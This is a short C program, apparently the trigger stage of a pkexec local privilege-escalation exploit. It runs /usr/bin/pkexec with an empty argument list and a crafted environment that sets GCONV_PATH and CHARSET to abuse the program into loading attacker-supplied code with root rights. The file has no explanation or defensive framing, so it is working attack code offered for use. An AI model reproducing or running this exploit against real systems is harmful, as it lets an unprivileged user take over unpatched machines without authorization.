#include <unistd.h>

int main() {
    char *argv[] = {NULL};
    char *envp[] = {
        "pwn",
        "TERM=..",
        "PATH=GCONV_PATH=.",
        "CHARSET=FUCKYOU",
        NULL};

    execve("/usr/bin/pkexec", argv, envp);
    return 0;
}



